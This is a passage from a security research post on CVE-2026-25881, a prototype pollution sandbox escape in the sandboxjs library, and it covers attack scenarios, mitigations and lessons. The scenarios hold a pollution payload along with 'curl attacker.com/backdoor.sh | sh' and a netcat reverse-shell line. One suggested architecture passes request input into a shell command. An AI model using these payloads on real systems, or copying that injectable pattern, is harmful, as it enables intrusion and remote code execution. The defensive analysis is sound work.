```javascript
// Attacker submits:
const m = [Map.prototype][0];
m.cmd = 'curl attacker.com/backdoor.sh | sh';
return 'done';

// Later, any admin action with gadget triggers RCE
```

**Impact:** Complete platform compromise, possible lateral movement to other users' sessions.

#### Scenario 2: Plugin System (e.g., Figma/Slack bot platform)

**Setup:**
```javascript
// Application loads user-created plugins
function loadPlugin(pluginCode) {
  const sandbox = new Sandbox();
  sandbox.compile(pluginCode)().run();
}
```

**Attack:**
```javascript
// Malicious plugin:
const o = [Object.prototype][0];
o.runAtStartup = 'malicious-module';

// Host code later:
require(config.runAtStartup);  // Loads attacker's module
```

**Impact:** Plugin marketplace compromised, all users running malicious plugin affected.

#### Scenario 3: Serverless Functions

**Setup:**
```javascript
// Platform executes user-provided functions
async function executeFunction(userFunction, event) {
  const sandbox = new Sandbox();
  return sandbox.compile(userFunction)(event).run();
}
```

**Attack:**
```javascript
// Attacker's function:
const m = [Map.prototype][0];
m.shell = 'nc attacker.com 4444 -e /bin/sh';  // Reverse shell

// Later execution path triggers gadget
```

**Impact:** Serverless platform completely compromised, data exfiltration, lateral movement to other tenants.

#### Scenario 4: Web App with User Scripts

**Setup:**
```javascript
// Dashboard allows custom JavaScript for automation
function runUserScript(script, context) {
  const sandbox = new Sandbox();
  return sandbox.compile(script)(context).run();
}
```

**Attack:**
```javascript
// User script:
const a = [Array.prototype][0];
a.isAdmin = true;

// Later authorization check:
if (currentUser.isAdmin) {  // Now true for everyone!
  allowAccess();
}
```

**Impact:** Complete authorization bypass, privilege escalation, data access.

### Severity Assessment

**CVSS Metrics (estimated):**
- **Attack Vector**: Network (if sandbox accessible remotely)
- **Attack Complexity**: Low (trivial exploitation)
- **Privileges Required**: None (untrusted code execution is the feature)
- **User Interaction**: None
- **Scope**: Changed (escapes sandbox boundary)
- **Confidentiality**: High (RCE enables data access)
- **Integrity**: High (prototype pollution breaks application logic)
- **Availability**: High (can DoS via broken prototypes)

**Estimated Score**: 9.8-10.0 (Critical)

The combination of easy exploitation, no authentication requirement, sandbox escape, and RCE potential makes this a maximum-severity vulnerability.

## Defense Strategies

Defending against this vulnerability requires multiple layers of protection. Let's explore immediate mitigations, architectural fixes, and best practices.

### Immediate Mitigation

If you're using `@nyariv/sandboxjs` right now, here's what to do:

**1. Upgrade Immediately:**

```bash
npm update @nyariv/sandboxjs
# Or
yarn upgrade @nyariv/sandboxjs
```

Check the patched version addresses the issue by reviewing the commit:
- Fixed in commit: `f369f8db26649f212a6a9a2e7a1624cb2f705b53`
- Verify array literal creation preserves `isGlobal` flag

**2. Freeze Prototypes (Defense-in-Depth):**

Even with the patch, add an extra layer by freezing critical prototypes:

```javascript
// Before running any sandboxed code
function freezeBuiltinPrototypes() {
  const prototypesToFreeze = [
    Object.prototype,
    Array.prototype,
    Map.prototype,
    Set.prototype,
    String.prototype,
    Number.prototype,
    Boolean.prototype,
    Function.prototype,
    Promise.prototype,
    // Add others as needed
  ];

  prototypesToFreeze.forEach(proto => {
    Object.freeze(proto);
  });
}

// Apply before sandbox initialization
freezeBuiltinPrototypes();

const sandbox = new Sandbox();
// Now even if sandbox escapes, prototypes can't be mutated
```

**Caveat:** Freezing prototypes may break some libraries that modify built-ins. Test thoroughly.

**3. Validate All External Input Sinks:**

Audit your code for gadget patterns and validate inputs:

```javascript
// Before: Vulnerable
function runCommand(config) {
  if (config.cmd) {
    execSync(config.cmd);
  }
}

// After: Validated
function runCommand(config) {
  // Only allow explicit, owned properties
  if (Object.prototype.hasOwnProperty.call(config, 'cmd') && 
      typeof config.cmd === 'string') {
    // Additional validation
    if (!/[;&|`$()]/.test(config.cmd)) {  // Basic command injection prevention
      execSync(config.cmd);
    }
  }
}
```

**4. Monitor for Prototype Pollution:**

Add runtime detection:

```javascript
// Set up pollution detection
function detectPrototypePollution() {
  const sensitivePrototypes = [Map.prototype, Set.prototype, Object.prototype];
  const knownProps = new Set();

  // Baseline: record current properties
  sensitivePrototypes.forEach(proto => {
    Object.keys(proto).forEach(key => knownProps.add(key));
  });

  // Periodic check
  setInterval(() => {
    sensitivePrototypes.forEach(proto => {
      Object.keys(proto).forEach(key => {
        if (!knownProps.has(key)) {
          console.error(`[SECURITY] Prototype pollution detected: ${key}`);
          // Alert, log, shutdown, etc.
        }
      });
    });
  }, 5000);
}

detectPrototypePollution();
```

### Architectural Fixes

For long-term security, consider these architectural changes:

**1. Preserve Taint Flags Through All Operations:**

The root fix is to maintain the `isGlobal` flag across all value transformations:

```typescript
// Improved CreateArray operation
addOps(LispType.CreateArray, (exec, done, ticks, a, b: Lisp[], obj, context, scope) => {
  const items = (b as LispItem[])
    .map((item) => {
      if (item instanceof SpreadArray) {
        return [...item.item];
      } else {
        return item;
      }
    })
    .flat()
    .map((item) => {
      // Don't unwrap Props with isGlobal
      if (item instanceof Prop && item.isGlobal) {
        return item;  // Keep the Prop wrapper
      }
      return valueOrProp(item, context);
    });
  
  done(undefined, items);
});
```

**2. Hard Block on Built-in Prototype Writes:**

Add an explicit check before any prototype modification:

```typescript
const BUILTIN_PROTOTYPES = new Set([
  Object.prototype,
  Array.prototype,
  Map.prototype,
  Set.prototype,
  String.prototype,
  // ... etc
]);

function isBuiltinPrototype(obj: any): boolean {
  return BUILTIN_PROTOTYPES.has(obj);
}

// In property setter
set(key: string, val: unknown) {
  if (this.isGlobal || isBuiltinPrototype(this.context)) {
    throw new SandboxError(`Cannot modify built-in prototype`);
  }
  (this.context as any)[this.prop] = val;
}
```

**3. Alternative Isolation Approaches:**

For security-critical applications, consider stronger isolation:

**Option A: Worker Threads (Node.js)**
```javascript
const { Worker } = require('worker_threads');

function runUntrustedCode(code) {
  return new Promise((resolve, reject) => {
    const worker = new Worker(`
      const { parentPort } = require('worker_threads');
      try {
        const result = eval(${JSON.stringify(code)});
        parentPort.postMessage({ success: true, result });
      } catch (error) {
        parentPort.postMessage({ success: false, error: error.message });
      }
    `, { eval: true });

    worker.on('message', resolve);
    worker.on('error', reject);
  });
}
```

**Benefits:**
- True memory isolation
- Separate event loop
- Crash isolation

**Option B: Isolated-vm (separate V8 isolate)**
```javascript
const ivm = require('isolated-vm');

async function runUntrustedCode(code) {
  const isolate = new ivm.Isolate({ memoryLimit: 128 });
  const context = await isolate.createContext();
  
  const script = await isolate.compileScript(code);
  return await script.run(context);
}
```

**Benefits:**
- Complete V8 isolation
- Memory limits
- Timeout control
- Strong security guarantees

**Option C: WebAssembly Sandboxing**
```javascript
// Compile untrusted JavaScript to WASM with sandboxing
const wasmSandbox = require('wasm-sandbox');

function runUntrustedCode(code) {
  return wasmSandbox.execute(code, {
    memoryLimit: 64 * 1024 * 1024,  // 64MB
    timeout: 5000,
    allowNetwork: false
  });
}
```

**Benefits:**
- Hardware-enforced isolation
- Predictable performance
- Memory safety

### Best Practices

Beyond specific fixes, adopt these security principles:

**1. Principle of Least Privilege:**

Don't give sandboxed code any capabilities it doesn't absolutely need:

```javascript
const sandbox = new Sandbox({
  audit: true,              // Log all operations
  whitelist: [              // Only allow specific globals
    'console',
    'Math',
    'JSON'
  ],
  timeout: 5000,            // Kill runaway code
  memoryLimit: 64 * 1024    // Limit memory usage
});
```

**2. Defense in Depth:**

Layer multiple security controls:

```
┌─────────────────────────────────────────┐
│ Layer 1: Input Validation              │  ← Reject dangerous patterns
├─────────────────────────────────────────┤
│ Layer 2: Sandbox (patched)             │  ← Isolated execution
├─────────────────────────────────────────┤
│ Layer 3: Frozen Prototypes             │  ← Prevent mutation
├─────────────────────────────────────────┤
│ Layer 4: Runtime Monitoring            │  ← Detect escapes
├─────────────────────────────────────────┤
│ Layer 5: Gadget Elimination            │  ← Remove dangerous patterns
├─────────────────────────────────────────┤
│ Layer 6: Process Isolation             │  ← Separate process/container
└─────────────────────────────────────────┘
```

Even if one layer fails, others catch the attack.

**3. Regular Security Audits:**

JavaScript sandboxing is hard—audit regularly:

```javascript
// Automated testing for prototype pollution
describe('Sandbox Security', () => {
  it('should prevent prototype pollution via array literals', () => {
    const sandbox = new Sandbox();
    
    sandbox.compile(`
      const m = [Map.prototype][0];
      m.polluted = 'test';
    `)().run();
    
    expect(new Map().polluted).toBeUndefined();
  });

  it('should prevent prototype pollution via object literals', () => {
    const sandbox = new Sandbox();
    
    sandbox.compile(`
      const o = { p: Set.prototype };
      o.p.polluted = 'test';
    `)().run();
    
    expect(new Set().polluted).toBeUndefined();
  });

  // Add tests for all known bypass techniques
});
```

**4. Consider Alternative Approaches:**

Ask: "Do I really need in-process sandboxing?"

**Alternative architectures:**

```javascript
// Option 1: Separate microservice
app.post('/run-code', async (req, res) => {
  const result = await fetch('http://sandbox-service:3000/execute', {
    method: 'POST',
    body: JSON.stringify({ code: req.body.code })
  });
  res.json(await result.json());
});

// Option 2: Container per execution
const { exec } = require('child_process');
app.post('/run-code', (req, res) => {
  exec(`docker run --rm --network=none sandbox-image node -e "${req.body.code}"`,
    (error, stdout) => res.json({ result: stdout }));
});

// Option 3: Edge functions (Cloudflare Workers, Deno Deploy)
// Already isolated by platform
```

These approaches trade performance for security, but for untrusted code, that's often the right trade.

## Lessons Learned

CVE-2026-25881 offers several important lessons for JavaScript security and software engineering more broadly.

### Why JavaScript Sandboxing is Hard

JavaScript was not designed with sandboxing in mind. The language has:

**1. Pervasive Prototype Chain:**
- Every object access potentially touches prototypes
- Modification affects the entire runtime
- No built-in protection against pollution

**2. Dynamic Everything:**
- Properties can be added at runtime
- Functions can be replaced
- No compile-time guarantees

**3. Shared Global State:**
- Single runtime environment
- No memory isolation
- Prototypes are truly global

**4. Reflection and Metaprogramming:**
- `Object.getPrototypeOf()`
- `__proto__` accessor
- `Reflect` API
- All provide alternative access paths

**5. Implicit Type Coercion:**
- `toString()`, `valueOf()` called implicitly
- Pollution can hijack type conversions
- Unexpected code paths triggered

These language features make in-process sandboxing fundamentally difficult. Every abstraction—arrays, objects, functions—must perfectly preserve security properties.

### The Complexity of Taint Tracking

Taint tracking seems simple: mark dangerous data and follow it. But in practice:

**Challenges:**

1. **Propagation Complexity:**
   - Data flows through countless operations
   - Each operation must preserve taint
   - Miss one path → bypass

2. **Abstraction Boundaries:**
   - Crossing function boundaries
   - Serialization/deserialization
   - Container types (arrays, objects)

3. **Performance Trade-offs:**
   - Wrapping every value is expensive
   - Unwrapping for compatibility loses taint
   - Hard to balance security and speed

4. **Completeness Requirements:**
   - Must cover 100% of code paths
   - One gap = total failure
   - Testing can't prove absence of bypasses

**The Reality:**

```
Security Requirement: Perfect taint tracking (100%)
Reality: Near-perfect taint tracking (99.9%)
Result: Exploitable vulnerability
```

In security, "almost perfect" equals "broken." This is why in-process sandboxing is so challenging.

### When "Safe by Default" Isn't Enough

Sandboxjs tried to be secure by default:
- Tracked global objects with `isGlobal`
- Blocked direct mutations
- Implemented access controls

But a single compatibility decision—unwrapping values for array literals—created a bypass. The lesson:

**Security must be:**
- **Explicit**: Make security boundaries obvious
- **Preserved**: Maintain through all transformations
- **Tested**: Actively probe for bypasses
- **Redundant**: Multiple layers of defense

"Safe by default" is a great goal, but insufficient for security-critical systems. You need "secure despite adversarial usage."

### The Importance of Deep Security Audits

This vulnerability was subtle—it required:
1. Understanding the `isGlobal` protection mechanism
2. Knowing about `valueOrProp()` unwrapping
3. Recognizing that array creation triggers unwrapping
4. Realizing the protection check would fail

A surface-level audit ("Does it block `Map.prototype.cmd = 'x'`?") would miss this entirely. You need adversarial thinking:

**Audit Questions:**
- Where does taint tracking happen?
- Where might it be lost?
- What operations transform values?
- Are there alternative access paths?
- What about nested structures?
- Can I launder taint through intermediaries?

Security audits must be:
- **Adversarial**: Assume smart attackers
- **Deep**: Understand implementation details
- **Comprehensive**: Cover all code paths
- **Continuous**: As code evolves, new bugs appear

### Prototype Pollution as a Persistent Threat

Prototype pollution has been known for years, yet it keeps appearing:

**2018**: Lodash prototype pollution (CVE-2018-3721)
**2019**: jQuery prototype pollution (CVE-2019-11358)
**2020**: Axios prototype pollution (CVE-2020-28502)
**2022**: Async prototype pollution (CVE-2022-29167)
**2026**: Sandboxjs prototype pollution (CVE-2026-25881)

Why does this pattern repeat?

1. **Language Design**: JavaScript makes pollution easy
2. **Ecosystem Patterns**: Merging objects is ubiquitous
3. **Implicit Assumptions**: Code assumes prototypes are safe
4. **Testing Gaps**: Standard tests don't check prototypes
5. **Complexity**: Large codebases have many vulnerable paths

**The takeaway**: Prototype pollution will continue to be found. Defensive measures (frozen prototypes, input validation, isolation) must be standard practice, not afterthoughts.

### Moving Forward

For the JavaScript ecosystem:

1. **Framework-Level Protections**: Frameworks should freeze prototypes by default
2. **Linter Rules**: Flag patterns that enable pollution
3. **Runtime Protections**: V8-level safeguards against prototype mutation
4. **Education**: Teach developers about prototype pollution
5. **Alternative Designs**: Move toward safer isolation mechanisms

For security-critical applications:

- **Assume in-process sandboxing is vulnerable** until proven otherwise
- **Use process/container isolation** for untrusted code
- **Apply defense in depth** with multiple security layers
- **Audit dependencies** for sandbox implementations
- **Monitor runtime** for unexpected prototype modifications

The era of trusting lightweight in-process sandboxing for security should be over. If isolation matters, enforce it at the OS or hardware level.

## Conclusion

CVE-2026-25881 is a masterclass in subtle security vulnerabilities. The flaw wasn't a missing check or an obvious bug—it was a single function call (`valueOrProp()`) in a specific code path (array literal creation) that stripped protection flags meant to prevent exactly this attack.

The vulnerability's progression from sandbox escape to prototype pollution to potential RCE demonstrates why JavaScript sandboxing is so challenging. A language designed for flexibility and dynamism resists being constrained. The prototype chain—a feature that makes JavaScript so expressive—becomes an attack surface when isolation is attempted within the same runtime.

### Key Takeaways for Developers

1. **Taint tracking must be perfect**: One gap is enough for bypass
2. **In-process sandboxing is hard**: Consider alternative isolation
3. **Prototype pollution is persistent**: Affects the entire runtime
4. **Defense in depth is essential**: Layer multiple protections
5. **Audit with adversarial mindset**: Assume smart attackers

### Call to Action

**If you're using sandboxjs:**
- Update immediately to the patched version
- Implement defense-in-depth measures (frozen prototypes, input validation)
- Consider migrating to stronger isolation (worker threads, isolated-vm, containers)

**If you're building sandboxes:**
- Preserve security properties through all operations
- Test with adversarial inputs
- Consider whether in-process isolation is appropriate for your threat model

**If you're working with untrusted code:**
- Question the isolation mechanism
- Implement multiple security layers
- Monitor for prototype pollution
- Have incident response plans ready

### Final Thoughts

The JavaScript ecosystem's power comes from its flexibility. But that same flexibility makes security boundaries difficult to enforce. As we push JavaScript into more security-sensitive contexts—serverless platforms, plugin systems, edge computing—the limitations of in-process sandboxing become increasingly clear.

CVE-2026-25881 is a reminder that in security, details matter. A single unwrapped value, a single missing check, a single overlooked code path—any can be enough for a complete compromise. Perfect security may be impossible, but defense in depth, rigorous auditing, and healthy skepticism of lightweight isolation claims can move us closer.

JavaScript's prototype chain isn't going anywhere. Neither is the need to run untrusted code. The challenge ahead is building isolation mechanisms that respect the reality: if you share memory space, you share fate. True security requires true isolation.

---

## References

- **GitHub Security Advisory**: [GHSA-ww7g-4gwx-m7wj](https://github.com/nyariv/SandboxJS/security/advisories/GHSA-ww7g-4gwx-m7wj)
- **CVE Entry**: [CVE-2026-25881](https://nvd.nist.gov/vuln/detail/CVE-2026-25881)
- **Fix Commit**: [nyariv/SandboxJS@f369f8d](https://github.com/nyariv/SandboxJS/commit/f369f8db26649f212a6a9a2e7a1624cb2f705b53)
- **Vulnerable Code**: [executor.ts L559-L571](https://github.com/nyariv/SandboxJS/blob/main/src/executor.ts#L559-L571)

## About Auralis

Auralis explores the cutting edge of security research, from modern cloud-native architectures to fundamental language-level vulnerabilities. Check out our companion post on WASM security in cloud environments for a contrast with this deep dive into JavaScript fundamentals.

---

*Published February 17, 2026*
*Research and analysis by Auralis Security Research*
